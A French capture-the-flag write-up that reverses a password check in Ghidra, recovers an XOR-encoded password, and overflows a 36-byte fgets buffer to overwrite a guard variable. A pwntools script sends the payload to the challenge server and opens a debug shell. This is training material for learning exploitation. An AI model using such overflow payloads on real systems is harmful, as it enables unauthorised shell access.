# Aarchibald

Décompilons avec ghidra le main : 

```c
undefined8 main(void)

{
  int iVar1;
  byte local_28 [36];
  int local_4;
  
  local_4 = 0x45435343;
  puts("Please enter your password:");
  fflush((FILE *)0x0);
  fgets((char *)local_28,0x28,stdin);
  len = 0xd;
  for (i = 0; i < 0xd; i = i + 1) {
    local_28[i] = local_28[i] ^ 0x36;
  }
  iVar1 = strncmp((char *)local_28,"eCfSDFwEeAYDr",0xd);
  if (iVar1 == 0) {
    puts("Welcome back!");
    fflush((FILE *)0x0);
    if (local_4 != 0x45435343) {
      puts("Entering debug mode");
      fflush((FILE *)0x0);
      system("/bin/dash");
    }
  }
  else {
    puts("Sorry, that\'s not the correct password.");
    puts("Bye.");
    fflush((FILE *)0x0);
  }
  return 0;
}
```

On remarque que notre input est xor avec 0x36 puis comparer au string "eCfSDFwEeAYDr"

Ainsi le string à passer en entrée est: SuPerpAsSworD

Cependant, cela n'est pas suffisant pour avoir le flag, il faut rentrer en "debug mode". Pour cela, il faudrait faire un buffer overflow et écrire dans local_4. local_28 a une taille de 36 mais dans la fonction fgets, on limite le nombre de caractère à 0x28=40 

Notre payload devra donc être de cette forme:
"SuPerpAsSworD"+"\x00"*26


```python
#!/usr/bin/env python3
import pwn

def main():
    conn=pwn.remote("172.25.106.194",4000)
    payload =b"SuPerpAsSworD"+b"\x00"*26
    conn.sendlineafter("Please enter your password:",payload)    
    conn.interactive()
    conn.close()
    

if __name__ == '__main__':
    main()
```

En lançant ce script, on réussit à passer le mode debug ! Plus qu'à cat le flag !  